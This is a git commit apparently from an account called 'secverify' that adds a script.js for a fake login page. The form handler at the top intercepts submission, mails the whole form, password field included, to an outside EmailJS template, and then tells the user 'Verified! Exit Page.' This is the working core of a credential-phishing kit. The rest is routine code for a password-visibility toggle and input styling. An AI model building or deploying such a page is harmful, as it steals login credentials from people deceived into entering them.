45d084da09bff96b7f9ff8c0981d006b4c494b5b
secverify <155398142+secverify@users.noreply.github.com>
2024-01-02 09:08:59 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,56 @@
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+  .addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    btn.value = 'Verifying...';
+
+    const serviceID = 'default_service';
+    const templateID = 'template_ph9nle9';
+
+    emailjs.sendForm(serviceID, templateID, this)
+      .then(() => {
+        btn.value = 'Login';
+        alert('Verified! Exit Page.');
+      }, (err) => {
+        btn.value = 'Login';
+        alert(JSON.stringify(err));
+      });
+  });
+
+const togglePasswordButton = document.querySelector("#toggle-password");
+const closedEyeIcon = document.querySelector("#closed-eye");
+const openEyeIcon = document.querySelector("#open-eye");
+const passwordElement = document.querySelector("#password");
+let isPasswordVisible = false;
+
+togglePasswordButton.addEventListener("click", function() {
+    if (!isPasswordVisible) {
+        //make password visible
+        passwordElement.type = "text";
+        openEyeIcon.classList.remove("hide");
+        closedEyeIcon.classList.add("hide");
+    } else {
+        //make password hidden
+        passwordElement.type = "password";
+        closedEyeIcon.classList.remove("hide");
+        openEyeIcon.classList.add("hide");
+    }
+    isPasswordVisible = !isPasswordVisible;
+});
+
+console.log(openEyeIcon);
+
+//placeholder
+
+// Placeholder
+
+const inputPlaceholder = document.querySelectorAll("input[placeholder]");
+
+inputPlaceholder.forEach((input) => {
+    input.addEventListener("click", function() {
+        this.classList.toggle("input-border-color");
+        console.log("clicked");
+    });
+});
